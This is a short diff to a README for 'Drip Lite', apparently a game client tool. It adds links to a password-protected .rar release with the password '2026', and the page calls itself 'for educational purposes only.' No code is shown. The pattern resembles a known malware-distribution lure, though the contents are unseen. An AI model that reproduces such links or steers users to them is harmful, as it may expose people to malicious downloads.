@@ -13,8 +13,8 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 🔓 Download
-
+## 🔓 [Download](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/Drip-Lite-Client/Drip-Lite-Client.rar)
+##  PASSWORD 2026 PASSWORD 2026 
 
 ---
 
@@ -68,7 +68,8 @@ Drip Lite &amp; update + fix
 
 ---
 
-## 🔓 Download Now
+## 🔓 [Download](https://github.com/DoctorWhisper/Drip-Lite-Client/releases/download/Drip-Lite-Client/Drip-Lite-Client.rar)
+## PASSWORD 2026 PASSWORD 2026 
 
 
 *© 2026 Drip Lite — For educational purposes only.*
